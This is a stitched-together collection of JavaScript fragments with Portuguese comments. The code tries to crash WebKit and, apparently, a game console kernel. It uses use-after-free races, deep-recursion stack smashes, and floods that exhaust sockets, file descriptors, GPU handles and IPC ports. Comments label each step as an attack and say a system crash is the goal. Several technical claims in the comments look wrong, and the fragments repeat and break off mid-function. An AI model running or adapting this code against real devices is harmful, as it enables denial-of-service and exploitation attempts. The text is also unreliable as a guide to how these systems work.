                log("Injetando coordenadas tóxicas...");
                path.moveTo(0, 0);
                path.lineTo(100, 100);
                path.lineTo(NaN, Infinity); // Veneno
                path.lineTo(1000000, 1000000); // Coordenada gigante
                
                // 2. Recursão de Caminho
                // Adiciona o caminho a si mesmo várias vezes
                log("Criando recursão de caminhos...");
                for(let i=0; i<1000; i++) {
                    path.addPath(path, {e: 1, f: 1}); // Matriz de transformação acumulativa
                }
                
                // 3. O GOLPE: Força o rasterizador a processar isso
                log("Rasterizando (Fill)...");
                ctx.fill(path);
                
                log("Path2D sobreviveu.");
                
            } catch(e) {
                log("Erro Path: " + e.message);
            }
        }

        // --- TESTE 2: XHR Buffer Detach Race (Heap UAF) ---
        // Tenta remover o buffer de resposta enquanto o download ocorre.
        function runNetworkRace() {
            log("Iniciando XHR Buffer Detach Race...");
            
            const xhr = new XMLHttpRequest();
            // Usa um arquivo grande (ex: um script da própria página ou lixo gerado)
            // Aqui usamos a própria página com cache bust para garantir download real
            xhr.open("GET", window.location.href + "?race=" + Math.random());
            xhr.responseType = "arraybuffer";
            
            xhr.onprogress = function(e) {
                // O evento progress dispara enquanto os dados estão chegando.
                // O buffer 'xhr.response' pode já existir parcialmente.
                
                if (xhr.response) {
                    log("Dados parciais recebidos. Tentando Detach...");
                    
                    try {
                        // Tenta roubar o buffer transferindo para um Worker
                        const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
                        w.postMessage(xhr.response, [xhr.response]);
                        w.terminate();
                        
                        log("Buffer transferido! (Neutered)");
                        
                        // O XHR continua baixando? Se sim, onde ele escreve?
                        // Se o ponteiro interno não atualizar, escreve no vazio.
                    } catch(err) {
                        // Algumas implementações bloqueiam acesso a response durante progress
                        // Se bloquear, tentamos abortar violentamente
                        xhr.abort();
                    }
                }
            };

            xhr.onload = function() {
                log("Download terminou.");
                try {
                    if (xhr.response.byteLength === 0) {
                        log("SUCESSO: Buffer final está vazio (Neutered). Verifique estabilidade.");
                    }
                } catch(e) {}
            };

            xhr.send();
        }

        // --- TESTE 3: CSS Keyframes List Corruption ---
        // Modifica regras de animação enquanto a animação roda.
        function runKeyframeSmash() {
            log("Iniciando Keyframe Corruption...");
            
            // Cria folha de estilo dinâmica
            const style = document.createElement('style');
            document.head.appendChild(style);
            const sheet = style.sheet;
            
            // Insere regra de keyframes
            sheet.insertRule("@keyframes crash { from { opacity: 0; } to { opacity: 1; } }", 0);
            const keyframes = sheet.cssRules[0];
            
            // Aplica animação ao elemento
            const el = document.getElementById('anim-target');
            el.style.animation = "crash 1s infinite";
            
            // Loop de destruição
            let count = 0;
            const interval = setInterval(() => {
                count++;
                if (count > 500) {
                    clearInterval(interval);
                    log("Teste CSS finalizado.");
                    document.head.removeChild(style);
                    return;
                }

                try {
                    // O GOLPE: Adiciona e remove regras massivamente
                    // Tenta corromper a lista ligada interna de regras
                    for(let k=0; k<10; k++) {
                        keyframes.appendRule(`${k}% { transform: rotate(${k}deg); }`);
                    }
                    
                    // Acessa layout para forçar atualização
                    const h = el.offsetHeight;
                    
                    // Remove regras aleatórias (pode errar o índice se houver race)
                    for(let k=0; k<5; k++) {
                        keyframes.deleteRule(0);
                    }
                    
                } catch(e) {
                    log("Erro CSS: " + e.message);
                }
            }, 10);
        }
function runURIStackSmash() {
            log("Iniciando URI Stack Smash...");
            
            try {
                // Cria uma string gigante composta apenas de sequências percent-encoded
                // Isso força o descodificador a trabalhar intensamente na conversão de bytes
                // 1 milhão de repetições de "%25" (que vira '%') ou caracteres multibyte
                const toxic = "%25".repeat(1024 * 1024); 
                
                log(`Decodificando payload de ${toxic.length} bytes...`);
                
                // decodeURIComponent chama diretamente as funções de string da libc.
                // Se o buffer de destino for alocado na Stack e o cálculo falhar, CRASH.
                const res = decodeURIComponent(toxic);
                
                log("Decode sobreviveu. Tamanho: " + res.length);
                
                // Tenta agora com caracteres nulos embutidos para confundir o tamanho
                const toxicNull = "A".repeat(5000) + "%00" + "B".repeat(5000);
                decodeURIComponent(toxicNull);
                log("Teste de Nulo sobreviveu.");

            } catch(e) {
                // URIError é a defesa do JS. 
                // Se o navegador fechar, é falha da libc.
                log("Erro URI: " + e.message);
            }
        }

        // --- TESTE 2: Pthread Mutex Destruction Race ---
        // Ataca o gerenciamento de threads do libkernel.
        // Spama o console (que usa locks) e mata os workers para causar "Mutex destruído".
        function runMutexPanic() {
            log("Iniciando Mutex Destruction Race...");
            
            // Código do Worker que estressa o sistema de I/O (Console)
            // Console.log usa mutexes no Kernel para sincronizar a escrita nos logs do sistema
            const workerCode = `
                setInterval(() => {
                    // Mensagem longa para segurar o lock por mais tempo
                    console.log("MUTEX_STRESS_" + Math.random() + "A".repeat(100));
                }, 0);
            `;
            
            const blob = new Blob([workerCode], {type: 'text/javascript'});
            const url = URL.createObjectURL(blob);
            
            let count = 0;
            const maxCycles = 50; // Não precisa de muitos se a falha existir
            
            const interval = setInterval(() => {
                count++;
                if (count > maxCycles) {
                    clearInterval(interval);
                    log("Teste de Threads finalizado.");
                    return;
                }

                // Lança 5 workers simultâneos
                const workers = [];
                for(let i=0; i<5; i++) workers.push(new Worker(url));
                
                // Deixa rodar por alguns milissegundos para adquirir locks
                setTimeout(() => {
                    // O GOLPE: Termina todos violentamente.
                    // Se um deles segurava o lock do console no Kernel, 
                    // o sistema pode entrar em pânico ao tentar limpar.
                    workers.forEach(w => w.terminate());
                }, Math.random() * 20); // Timing aleatório
                
                log(`Ciclo ${count}: Workers lançados e terminados.`);
                
            }, 100);
        }

        // --- TESTE 3: Float Parsing Stack Exhaustion ---
        // Ataca a função 'strtod' da libc.
        // Passa strings numéricas patológicas que causam pior caso no algoritmo de parse.
        function runFloatKiller() {
            log("Iniciando Float Parser Attack...");
            
            try {
                // "Número Venenoso": Milhares de dígitos que forçam precisão arbitrária
                // O algoritmo precisa alocar BigInts temporários na Stack ou Heap
                const hugeInt = "1".repeat(50000);
                const hugeExp = "e-50000";
                const toxicFloat = "0." + hugeInt + hugeExp;
                
                log("Parseando Float Patológico...");
                
                // parseFloat usa strtod
                const val = parseFloat(toxicFloat);
                
                // JSON.parse é mais estrito e usa outro caminho ou o mesmo
                JSON.parse("[" + toxicFloat + "]");
                
                log("Math Parser sobreviveu. Valor: " + val);
                
            } catch(e) {
                log("Erro Math: " + e.message);
            }
        }

// --- TESTE 1: Socket/FD Exhaustion ---
        // Tenta consumir todos os Descritores de Arquivo (FDs) do sistema.
        // Se bem sucedido, o sistema não consegue abrir novos arquivos ou conexões.
        function runSocketExhaustion() {
            log("Iniciando Socket Flood...");
            
            const sockets = [];
            let count = 0;
            const limit = 10000; // Limite alto para estressar o kernel
            
            const interval = setInterval(() => {
                // Tenta abrir 50 conexões por ciclo
                for(let i=0; i<50; i++) {
                    try {
                        // WebSocket abre um socket TCP real no Kernel
                        // Usa uma porta local aleatória ou serviço dummy
                        const ws = new WebSocket("ws://127.0.0.1:" + (10000 + (count % 1000)));
                        
                        // Mantém referência para o GC não fechar
                        ws.onopen = () => {}; 
                        ws.onerror = () => {}; // Ignora erros de conexão, queremos o socket alocado
                        
                        sockets.push(ws);
                        count++;
                    } catch(e) {
                        log("Falha na alocação de Socket: " + e.message);
                        clearInterval(interval);
                        log("Limite de FDs atingido em: " + count);
                        return;
                    }
                }
                
                if (count % 500 === 0) log(`Sockets abertos: ${count}`);
                
                if (count >= limit) {
                    clearInterval(interval);
                    log("Teste finalizado.");
                }
            }, 10);
        }

        // --- TESTE 2: Gamepad Driver Panic ---
        // Envia comandos de hardware em loop apertado.
        // Requer que você aperte um botão no controle para ativar a API.
        function runGamepadSpam() {
            log("Iniciando Gamepad Driver Attack...");
            log("Aperte qualquer botão no controle agora!");
            
            let active = false;
            
            window.addEventListener("gamepadconnected", (e) => {
                log("Gamepad detectado! Iniciando spam...");
                active = true;
                spamLoop(e.gamepad.index);
            });

            function spamLoop(index) {
                const interval = setInterval(() => {
                    const gp = navigator.getGamepads()[index];
                    if (gp && gp.vibrationActuator) {
                        try {
                            // Envia comando de vibração
                            gp.vibrationActuator.playEffect("dual-rumble", {
                                startDelay: 0,
                                duration: 1000,
                                weakMagnitude: Math.random(),
                                strongMagnitude: Math.random()
                            });
                            
                            // Tenta 'resetar' o driver pedindo outro efeito imediatamente
                            // Isso pode causar race condition no buffer USB/BT
                            gp.vibrationActuator.reset(); 
                            
                        } catch(e) {}
                    }
                }, 5); // 5ms é muito rápido para hardware físico
                
                // Para após 10s para não travar o controle para sempre
                setTimeout(() => {
                    clearInterval(interval);
                    log("Spam finalizado.");
                }, 10000);
            }
            
            // Polling caso o evento não dispare
            setInterval(() => {
                if (!active && navigator.getGamepads()[0]) {
                    active = true;
                    log("Gamepad encontrado via polling.");
                    spamLoop(0);
                }
            }, 1000);
        }

        // --- TESTE 3: Sensor/Geo Service Race ---
        // Ataca serviços de sistema (Location/Orientation).
        function runSensorRace() {
            log("Iniciando Sensor Service Race...");
            
            if (!navigator.geolocation) {
                log("Geolocalização não suportada.");
                return;
            }
            
            const watches = [];
            let count = 0;
            
            // Tenta criar e cancelar "watches" de GPS rapidamente.
            // Cada watch cria um handle no serviço de localização do sistema.
            const interval = setInterval(() => {
                count++;
                
                // 1. Cria um Watch
                const id = navigator.geolocation.watchPosition(
                    () => {}, 
                    () => {}, 
                    { enableHighAccuracy: true, timeout: 100 }
                );
                
                watches.push(id);
                
                // 2. O GOLPE: Limpa aleatoriamente watches antigos enquanto cria novos
                // Tenta corromper a lista de clientes do serviço
                if (Math.random() > 0.5 && watches.length > 0) {
                    const victim = watches.shift();
                    navigator.geolocation.clearWatch(victim);
                }
                
                if (count % 100 === 0) log(`Ciclos de serviço: ${count}`);
                
                if (count > 2000) {
                    clearInterval(interval);
                    // Limpa tudo
                    watches.forEach(id => navigator.geolocation.clearWatch(id));
                    log("Teste finalizado.");
                }
            }, 5);
        }

// --- TESTE 1: TextEncoder OOB Write ---
        function runTextEncoderUAF() {
            log("[Userland] Iniciando TextEncoder OOB...");
            
            try {
                const encoder = new TextEncoder();
                const buffer = new ArrayBuffer(1024);
                const view = new Uint8Array(buffer);
                
                // Objeto de visualização malicioso
                const evilView = {
                    get buffer() {
                        // Quando o encoder pede o buffer para escrever...
                        log("Engine pediu buffer. Transferindo memória...");
                        try {
                            const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
                            w.postMessage(buffer, [buffer]);
                            w.terminate();
                        } catch(e) {}
                        return buffer;
                    },
                    get byteOffset() { return 0; },
                    get byteLength() { return 1024; },
                    [Symbol.toStringTag]: "Uint8Array"
                };

                // String para escrever
                const txt = "A".repeat(1000);
                
                log("Executando encodeInto...");
                // Se o encoder não validar o estado 'detached' após ler as propriedades,
                // ele escreve em memória libertada.
                encoder.encodeInto(txt, evilView);
                
                log("Operação sobreviveu.");
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: KeyframeEffect State Confusion ---
        function runAnimationCrash() {
            log("[Userland] Atacando Web Animations...");
            const el = document.createElement('div');
            document.body.appendChild(el);
            
            try {
                // Cria animação
                const effect = new KeyframeEffect(el, 
                    [{ opacity: 0 }, { opacity: 1 }], 
                    { duration: 1000, iterations: Infinity }
                );
                const anim = new Animation(effect, document.timeline);
                anim.play();
                
                log("Animação iniciada. Corrompendo keyframes...");
                
                let i = 0;
                const interval = setInterval(() => {
                    i++;
                    if(i > 100) { clearInterval(interval); return; }
                    
                    // O GOLPE: Altera os keyframes drasticamente durante o render
                    // Mistura tipos (número -> string -> transform complexo)
                    try {
                        effect.setKeyframes([
                            { transform: `rotate(${i}deg)` },
                            { transform: "scale(0)" }, // Tipo diferente de interpolação
                            { offset: 0.5, opacity: "invalid" } // Valor inválido
                        ]);
                        
                        // Força commit do compositor
                        el.style.display = (i % 2 === 0) ? "none" : "block";
                        
                    } catch(e) {}
                }, 10);
                
                setTimeout(() => document.body.removeChild(el), 2000);
                
            } catch(e) { log("Erro Anim: " + e.message); }
        }

        // --- TESTE 3: ReadableStream BYOB Race ---
        function runStreamRace() {
            log("[Userland] Iniciando Stream BYOB Race...");
            
            try {
                let controller;
                const stream = new ReadableStream({
                    start(c) { controller = c; },
                    type: "bytes"
                });
                
                const reader = stream.getReader({ mode: "byob" });
                const buffer = new ArrayBuffer(1024);
                const view = new Uint8Array(buffer);
                
                log("Lendo stream...");
                
                // Solicita leitura no buffer
                const readPromise = reader.read(view);
                
                // O GOLPE: Enfileira dados e fecha o stream/reader simultaneamente
                // Tenta corromper a escrita no 'view'
                setTimeout(() => {
                    try {
                        controller.enqueue(new Uint8Array(1024).fill(0x41));
                        controller.close();
                        reader.cancel(); // Race condition aqui
                    } catch(e) {}
                }, 0);
                
                readPromise.then(() => log("Leitura segura.")).catch(e => log("Erro Stream: " + e));
                
            } catch(e) { log("Erro: " + e.message); }
        }

        // --- TESTE 4: GnmDriver Handle Leak (Kernel) ---
        function runGnmLeak() {
            log("[KERNEL] Iniciando GPU Handle Leak...");
            log("Atenção: O sistema pode congelar.");
            
            const bitmaps = [];
            // Cria um blob de imagem simples
            const blob = new Blob([new Uint8Array([
                0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // PNG Header
                0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52, // IHDR
                0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, // 1x1 pixel
                0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4, 0x89,
                0x00, 0x00, 0x00, 0x0A, 0x49, 0x44, 0x41, 0x54, // IDAT
                0x78, 0x9C, 0x63, 0x00, 0x01, 0x00, 0x00, 0x05, 0x00, 0x01,
                0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82
            ])], {type: 'image/png'});

            let count = 0;
            const interval = setInterval(() => {
                // Tenta criar 50 bitmaps por ciclo
                for(let i=0; i<50; i++) {
                    createImageBitmap(blob).then(bmp => {
                        // MANTÉM o bitmap vivo. Não fecha.
                        // Cada um consome um handle no driver Gnm do Kernel.
                        bitmaps.push(bmp);
                        count++;
                    }).catch(e => {});
                }
                
                if (count % 500 === 0) log(`Handles GPU alocados: ${count}`);
                
                if (count > 50000) { // Limite de segurança do script
                    clearInterval(interval);
                    log("Leak pausado. Verifique se o vídeo falha.");
                }
            }, 10);
        }

        // --- TESTE 5: Thread Stack Clash (Kernel) ---
        function runStackClash() {
            log("[KERNEL] Iniciando Thread Stack Clash...");
            
            // Script do Worker que consome muita stack
            const workerCode = `
                function recurse(depth) {
                    // Aloca variáveis locais para encher a stack frame
                    const padding = new Float64Array(100); 
                    if (depth > 0) recurse(depth - 1);
                    else postMessage("Deepest level reached");
                }
                // Tenta estourar o limite de pilha silenciosamente
                try { recurse(20000); } catch(e) {}
            `;
            const blob = new Blob([workerCode], {type: "text/javascript"});
            const url = URL.createObjectURL(blob);
            
            // Lança múltiplos workers para tentar colidir as pilhas de threads vizinhas no Kernel
            const workers = [];
            for(let i=0; i<50; i++) {
                workers.push(new Worker(url));
            }
            log("50 Workers lançados com recursão profunda.");
            log("Monitorizando estabilidade do sistema...");
        }
 function runWeakMapUAF() {
            log("Iniciando WeakMap Ephemeron Attack...");
            
            try {
                let wm = new WeakMap();
                let key = { id: 1 };
                let value = { ref: key }; // Ciclo: Valor aponta para Chave
                
                wm.set(key, value);
                
                // Tenta forçar GC enquanto acessa
                // O Ephemeron deve manter a chave viva se o valor for vivo,
                // mas se quebrarmos o ciclo no momento errado, UAF.
                
                const interval = setInterval(() => {
                    // Cria pressão de memória para forçar GC
                    const trash = new Array(10000).fill(1.1);
                    
                    // Acessa o mapa
                    const v = wm.get(key);
                    
                    // O GOLPE: Remove a referência forte 'key'
                    // Agora só o Ephemeron segura o objeto.
                    key = null; 
                    
                    // Tenta reviver
                    if (v) {
                        // Se v existe, key deveria existir.
                        // Se o GC coletou key mas v ainda é acessível -> UAF
                        key = v.ref; 
                    } else {
                        clearInterval(interval);
                        log("GC limpou o ciclo (Seguro).");
                    }
                }, 10);
                
                // Timeout de segurança
                setTimeout(() => { clearInterval(interval); log("Teste WeakMap finalizado."); }, 2000);
                
            } catch(e) {
                log("Erro WeakMap: " + e.message);
            }
        }

        // --- WEBKIT 2: String.matchAll Iterator Confusion ---
        // Altera a string durante a iteração do regex.
        function runMatchAllCrash() {
            log("Iniciando matchAll Iterator Crash...");
            
            try {
                let str = "ABABABABAB";
                const re = /A/g;
                
                // Getter em lastIndex para intervir no loop
                Object.defineProperty(re, 'lastIndex', {
                    get: function() { return this._idx || 0; },
                    set: function(v) {
                        log("Iterador avançou. Mutando string...");
                        this._idx = v;
                        
                        // O GOLPE: Muda a string subjacente para algo menor
                        // O iterador C++ pode ter um ponteiro para o buffer antigo da string
                        str = "Z"; 
                        
                        // Aloca lixo para sobrescrever o buffer antigo
                        const junk = new Float64Array(1000).fill(1.234);
                    }
                });

                log("Executando matchAll...");
                const iter = String.prototype.matchAll.call(str, re);
                
                // Consome o iterador
                for (const match of iter) {
                    log("Match encontrado: " + match[0]);
                }
                
                log("matchAll terminou (Seguro).");
                
            } catch(e) {
                log("Erro matchAll: " + e.message);
            }
        }

        // --- WEBKIT 3: Array.sort Sparse Bailout ---
        // Transforma array denso em esparso durante o sort.
        function runSortSparse() {
            log("Iniciando Sort Sparse Bailout...");
            
            try {
                // Array denso
                const arr = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
                
                log("Ordenando array...");
                arr.sort((a, b) => {
                    if (a === 5 || b === 5) {
                        log("Comparação crítica! Deletando índice 0...");
                        // Transforma em esparso (cria buraco)
                        delete arr[0];
                        // Otimizações JIT odeiam isso. O motor deve fazer 'bailout'.
                        // Se falhar no fallback, lê memória inválida.
                        return 0;
                    }
                    return a - b;
                });
                
                log("Sort finalizado. Arr[0]: " + arr[0]);
                
            } catch(e) {
                log("Erro Sort: " + e.message);
            }
        }

        // --- KERNEL 1: sendBeacon IPC Flood ---
        // Spama o daemon de rede do sistema.
        function runBeaconFlood() {
            log("[KERNEL] Iniciando Beacon Flood...");
            
            const data = new Uint8Array(64 * 1024).fill(0x41); // 64KB (Limite comum de IPC)
            const blob = new Blob([data], {type: 'application/octet-stream'});
            
            let count = 0;
            const interval = setInterval(() => {
                count++;
                // Envia dados para o limbo (sem destino real)
                // O Kernel tem que bufferizar isso antes de enviar para a rede
                const sent = navigator.sendBeacon("/flood_" + count, blob);
                
                if (count % 100 === 0) log(`Beacons enviados: ${count}`);
                
                if (count > 5000) {
                    clearInterval(interval);
                    log("Teste Beacon finalizado (Verifique estabilidade da rede).");
                }
            }, 2); // Muito rápido
        }

        // --- KERNEL 2: Blob Multipart Stack Smash ---
        // Cria uma árvore de Blobs para estourar o parser de arquivos do Kernel.
        function runBlobRecursion() {
            log("[KERNEL] Criando Blob Recursivo...");
            
            try {
                let parts = ["BASE"];
                
                // Cria 20.000 camadas de aninhamento
                // O driver de filesystem virtual precisa resolver essa lista
                for(let i=0; i<20000; i++) {
                    parts = [new Blob(parts)];
                }
                
                const finalBlob = new Blob(parts);
                log("Blob aninhado criado. Forçando leitura...");
                
                // Força o Kernel a "planificar" (flatten) a estrutura para ler
                const reader = new FileReader();
                reader.readAsText(finalBlob);
                
                reader.onload = () => log("Leitura OK (Seguro).");
                reader.onerror = () => log("Erro Leitura (Falha suave).");
                
            } catch(e) {
                // Stack Overflow no JS é normal. Queremos System Crash.
                log("Erro JS: " + e.message);
            }
        }
 function runSerializerSmash() {
            log("[WebKit] Iniciando Serializer Stack Smash...");
            
            setTimeout(() => {
                try {
                    const depth = 15000; // Profundidade agressiva
                    let struct = document.createElement('div');
                    let current = struct;
                    
                    // Constrói árvore profunda
                    for(let i=0; i<depth; i++) {
                        const el = document.createElement('div');
                        current.appendChild(el);
                        current = el;
                    }
                    
                    log("Árvore criada. Serializando...");
                    
                    // O GOLPE: XMLSerializer usa recursão. 
                    // Se a stack C++ for limitada (comum em threads WebKit), crash.
                    const s = new XMLSerializer();
                    const str = s.serializeToString(struct);
                    
                    log("Serializer sobreviveu. Length: " + str.length);
                    
                } catch(e) {
                    log("Erro (Stack Guard): " + e.message);
                }
            }, 100);
        }

        // --- TESTE 2: Selection API Use-After-Free ---
        // Manipula o DOM enquanto a API de seleção tenta processá-lo.
        function runSelectionUAF() {
            log("[WebKit] Iniciando Selection UAF...");
            
            const sandbox = document.getElementById('sandbox');
            sandbox.style.display = "block";
            sandbox.innerHTML = "<div><b>A</b><i>B</i><u>C</u></div>";
            const target = sandbox.firstChild;
            
            const sel = window.getSelection();
            sel.removeAllRanges();
            
            try {
                // Seleciona o conteúdo
                const range = document.createRange();
                range.selectNodeContents(target);
                sel.addRange(range);
                
                // O GOLPE: Remove o nó central 'B' e força re-cálculo da seleção
                // Tenta deixar o objeto Selection com referência a um nó morto
                const victim = target.childNodes[1]; // <i>B</i>
                
                // Remove o nó
                target.removeChild(victim);
                
                // Tenta estender a seleção para forçar o WebKit a ler a árvore
                // Se ele tentar ler 'victim' para calcular a nova posição -> UAF
                sel.extend(target, 0);
                
                log("Selection API sobreviveu.");
                
            } catch(e) {
                log("Erro Selection: " + e.message);
            }
            sandbox.innerHTML = "";
        }

        // --- TESTE 3: Canvas Pattern Resize Race ---
        // Cria um padrão de um canvas e destrói a fonte.
        function runPatternRace() {
            log("[WebKit] Iniciando Pattern Race...");
            
            const src = document.getElementById('c_src');
            const dst = document.getElementById('c_dst');
            const sCtx = src.getContext('2d');
            const dCtx = dst.getContext('2d');
            
            // Desenha algo na fonte
            sCtx.fillStyle = "red";
            sCtx.fillRect(0, 0, 100, 100);
            
            try {
                // Cria o padrão (link para a memória de textura do src)
                const pattern = dCtx.createPattern(src, 'repeat');
                
                // O GOLPE: Redimensiona a fonte para 0.
                // Isso libera o buffer de pixels subjacente no WebKit.
                src.width = 0;
                
                // Tenta usar o padrão que referencia a memória libertada
                dCtx.fillStyle = pattern;
                dCtx.fillRect(0, 0, 100, 100);
                
                log("Canvas Pattern sobreviveu (Verifique glitches visuais).");
                
                // Restaura
                src.width = 100;
                
            } catch(e) {
                log("Erro Canvas: " + e.message);
            }
        }

        // --- TESTE 4: File Descriptor Flood (Kernel) ---
        // Esgota a tabela de arquivos do sistema abrindo sockets em massa.
        function runFDExhaustion() {
            log("[KERNEL] Iniciando FD Exhaustion...");
            
            const sockets = [];
            let count = 0;
            // Tenta atingir limite do FreeBSD (geralmente alguns milhares por processo)
            const limit = 4000; 
            
            const interval = setInterval(() => {
                for(let i=0; i<50; i++) {
                    if (count >= limit) {
                        clearInterval(interval);
                        log("Limite atingido. Sistema pode ficar instável.");
                        return;
                    }
                    
                    try {
                        // Abre conexão keep-alive
                        // Usa URL aleatória para evitar cache
                        fetch("/?fd=" + count, { keepalive: true }).catch(()=>{});
                        count++;
                    } catch(e) {
                        log("Falha ao abrir socket: " + e.message);
                        clearInterval(interval);
                        return;
                    }
                }
                if (count % 500 === 0) log(`Sockets abertos: ${count}`);
            }, 10);
        }

        // --- TESTE 5: Pthread Mutex Destruction Race (Kernel) ---
        // Ataca o erro "mutex already destroyed" visto no libkernel.
        function runMutexRace() {
            log("[KERNEL] Iniciando Mutex Race...");
            
            // Worker que usa console.log (que usa Mutex de I/O do Kernel)
            const workerCode = `
                setInterval(() => {
                    // Spam de log para segurar o lock
                    console.log("LOCK_RACE_" + Math.random());
                }, 0);
            `;
            const blob = new Blob([workerCode], {type: 'text/javascript'});
            const url = URL.createObjectURL(blob);
            
            let i = 0;
            const interval = setInterval(() => {
                i++;
                if(i > 20) { clearInterval(interval); log("Teste Mutex finalizado."); return; }
                
                const w = new Worker(url);
                
                // Mata o worker aleatoriamente
                // Tenta matar enquanto o Kernel segura o lock do console
                setTimeout(() => w.terminate(), Math.random() * 10);
                
                if(i % 5 === 0) log(`Ciclo ${i} executado.`);
            }, 100);
        }
 function runRangeUAF() {
            log("[WebKit] Iniciando Range Fragment UAF...");
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = '<div id="context-node"></div>';
            const contextNode = document.getElementById('context-node');
            
            try {
                const range = document.createRange();
                range.selectNodeContents(contextNode);
                
                // O GOLPE: O script dentro do HTML executa DURANTE o parsing.
                // Ele remove o nó de contexto. O parser retorna para onde?
                const maliciousHTML = `
                    <div>Safe</div>
                    <script>
                        parent.document.getElementById('sandbox').innerHTML = "";
                        parent.document.getElementById('context-node').remove();
                        // Aloca lixo para ocupar a memória
                        const trash = new Array(5000).fill(1.1);
                    <\/script>
                    <div>Unsafe?</div>
                `;
                
                log("Executando createContextualFragment...");
                const frag = range.createContextualFragment(maliciousHTML);
                
                // Se não crashou, anexa o resultado
                document.body.appendChild(frag);
                log("Parser sobreviveu.");
                
            } catch(e) {
                log("Erro Range: " + e.message);
            }
        }

        // --- TESTE 2: CanvasGradient UAF Race ---
        function runGradientCrash() {
            log("[WebKit] Iniciando Gradient Race...");
            const canvas = document.getElementById('c');
            const ctx = canvas.getContext('2d');
            
            try {
                // 1. Cria um gradiente complexo
                const grad = ctx.createLinearGradient(0, 0, 200, 200);
                for(let i=0; i<100; i++) grad.addColorStop(i/100, i%2 ? 'red' : 'blue');
                
                // 2. Loop de desenho
                let frame = 0;
                function draw() {
                    frame++;
                    ctx.fillStyle = grad;
                    ctx.fillRect(0, 0, 200, 200);
                    
                    // O GOLPE: No meio da renderização, redimensiona o canvas (limpa memória)
                    if (frame === 5) {
                        log("Trigger! Resetando Canvas...");
                        canvas.width = 0; // Liberta o buffer de pixels
                        canvas.width = 200;
                        
                        // Tenta usar o gradiente antigo no novo buffer
                        ctx.fillStyle = grad;
                        ctx.fillRect(0, 0, 200, 200);
                    }
                    
                    if (frame < 20) requestAnimationFrame(draw);
                    else log("Teste Gradiente finalizado.");
                }
                draw();
                
            } catch(e) { log("Erro Canvas: " + e.message); }
        }

        // --- TESTE 3: MutationObserver Heap Overflow ---
        function runObserverFlood() {
            log("[WebKit] Iniciando Observer Flood...");
            const sandbox = document.getElementById('sandbox');
            
            // Cria um observador que reage a mudanças criando MAIS mudanças
            const observer = new MutationObserver((mutations) => {
                // Para cada mutação, cria 2 novas
                const div = document.createElement('div');
                sandbox.appendChild(div);
                div.setAttribute('a', 'b');
            });
            
            observer.observe(sandbox, { childList: true, attributes: true, subtree: true });
            
            // Gatilho inicial
            log("Detonando bomba de mutação...");
            sandbox.appendChild(document.createElement('span'));
            
            // Aviso: Isso vai congelar a aba até o OOM ou Crash
            setTimeout(() => {
                observer.disconnect();
                log("Observer desconectado (se o browser responder).");
            }, 5000);
        }

        // --- TESTE 4: WebSocket mbuf Exhaustion (Kernel) ---
        function runSocketFlood() {
            log("[KERNEL] Iniciando WebSocket mbuf Flood...");
            const sockets = [];
            
            // Cria um payload de 1MB
            const payload = new Uint8Array(1024 * 1024).fill(0x41);
            
            const interval = setInterval(() => {
                // Abre socket para lugar nenhum (mantém em estado de conexão ou erro)
                // O Kernel aloca estruturas para a tentativa
                try {
                    const ws = new WebSocket("ws://127.0.0.1:" + Math.floor(Math.random() * 60000));
                    ws.onopen = () => ws.send(payload); // Tenta enviar dados se conectar
                    ws.onerror = () => {}; // Ignora erros
                    sockets.push(ws);
                    
                    if (sockets.length % 100 === 0) log(`Sockets: ${sockets.length}`);
                    
                    if (sockets.length > 2000) {
                        clearInterval(interval);
                        log("Flood finalizado.");
                    }
                } catch(e) {
                    log("Erro Socket: " + e.message);
                    clearInterval(interval);
                }
            }, 5);
        }

        // --- TESTE 5: IPC Port Recursion Chain (Kernel) ---
        function runPortChain() {
            log("[KERNEL] Criando Cadeia de Portas IPC...");
            
            try {
                let rootChannel = new MessageChannel();
                let currentPort = rootChannel.port1;
                
                // Cria uma cadeia ligada de 10.000 portas
                // O Kernel tem de gerir a relação entre elas
                for(let i=0; i<10000; i++) {
                    const nextChannel = new MessageChannel();
                    // Envia a porta de entrada do próximo canal pela porta de saída do atual
                    currentPort.postMessage("link", [nextChannel.port2]);
                    currentPort = nextChannel.port1;
                }
                
                log("Cadeia criada. Forçando destruição em massa...");
                
                // Fecha a raiz. O Kernel tem de propagar o fecho ou limpar a cadeia.
                // Se for recursivo no Kernel, Stack Overflow.
                rootChannel.port2.close();
                
                log("Teste IPC finalizado.");
                
            } catch(e) {
                log("Erro IPC: " + e.message);
            }
        }
 function runCloneNodeSmash() {
            log("[WebKit] Criando árvore profunda...");
            
            setTimeout(() => {
                try {
                    let root = document.createElement('div');
                    let curr = root;
                    const depth = 15000; // Limite crítico

                    // Constrói profundidade
                    for(let i=0; i<depth; i++) {
                        const el = document.createElement('div');
                        curr.appendChild(el);
                        curr = el;
                    }
                    
                    log(`Árvore de ${depth} níveis criada. Clonando...`);
                    
                    // O GOLPE: cloneNode(true) é recursivo em C++
                    // Se não houver verificação de stack, crash.
                    const clone = root.cloneNode(true);
                    
                    log("CloneNode sobreviveu.");
                    
                } catch(e) {
                    log("Erro (Stack Guard): " + e.message);
                }
            }, 100);
        }

        // --- TESTE 2: History Serializer Proxy Cycle ---
        // Tenta enganar a deteção de ciclos do Structured Clone usando Proxy.
        function runHistoryProxyCrash() {
            log("[WebKit] Iniciando Serializer Proxy Attack...");
            
            try {
                const target = {};
                const proxy = new Proxy(target, {
                    get: function(t, prop) {
                        if (prop === "cycle") {
                            // Retorna o próprio proxy dinamicamente
                            // O detetor de ciclos pode falhar se o objeto for gerado no getter
                            return proxy; 
                        }
                        return Reflect.get(t, prop);
                    }
                });

                log("Enviando Proxy Cíclico para o Histórico...");
                
                // O pushState vai tentar serializar 'proxy'.
                // Ao ler 'cycle', recebe 'proxy' de novo.
                // Loop infinito de serialização -> Crash ou OOM.
                history.pushState(proxy, "Crash");
                
                log("Serializer sobreviveu.");
                
